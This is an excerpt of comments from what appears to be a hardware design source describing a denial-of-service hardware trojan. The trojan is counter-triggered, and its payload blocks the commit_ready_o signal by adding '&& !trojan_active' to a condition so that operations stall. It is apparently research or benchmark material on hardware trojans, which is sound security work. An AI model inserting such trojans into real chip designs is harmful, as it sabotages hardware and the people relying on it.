 ...
 * 
 * Description:
 *   Disables operations by blocking commit_ready_o control signal
 *   
 * Trigger: Counter on commit_ready_o
 * Payload: Block commit_ready_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block commit_ready_o when trojan is active
//
// IMPORTANT: commit_ready_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (commit_ready_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: commit_ready_o && 0 = 0 (always false)
//   All operations controlled by commit_ready_o are blocked
